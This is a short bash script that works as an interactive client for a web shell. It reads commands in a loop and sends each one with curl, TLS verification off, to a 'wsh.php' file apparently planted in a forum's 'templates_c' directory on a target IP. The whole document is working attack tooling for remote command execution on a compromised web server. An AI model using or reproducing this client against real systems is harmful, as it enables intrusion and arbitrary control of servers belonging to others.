#!/bin/bash

if [ -z "${IPADDR}" ]; then
    echo "IPADDR env var is missing";
    exit 1;
fi

echo "Type exit to quit"
echo -n "wsh > ";

while IFS= read -r cmd; do
    if [ "$cmd" = "exit" ]; then
        echo "Bye";
        exit 1;
    fi
    curl -ks --get "https://$IPADDR/forum/templates_c/wsh.php" \
        --data-urlencode "x=$cmd";
    echo -n "wsh > ";
done
